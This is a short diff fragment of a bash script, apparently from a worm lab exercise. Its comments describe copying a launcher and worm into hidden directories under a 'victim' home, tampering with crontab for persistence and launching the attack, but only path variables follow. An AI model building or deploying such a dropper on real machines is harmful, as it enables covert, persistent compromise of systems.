@@ -1,3 +1,11 @@
+#!/bin/bash
+
+# This script is to:
+#   (1) Copy the launcher file into the default hidden directory
+#   (2) Copy the worm file into the default hidden directory
+#   (3) Tamper the crontab file
+#   (4) Launch the initial attack
+
 ldir1="/home/victim/.Launch_Attack"
 ldir2="/home/victim/.you_cant_see_me"
 lfname="launcher.sh"
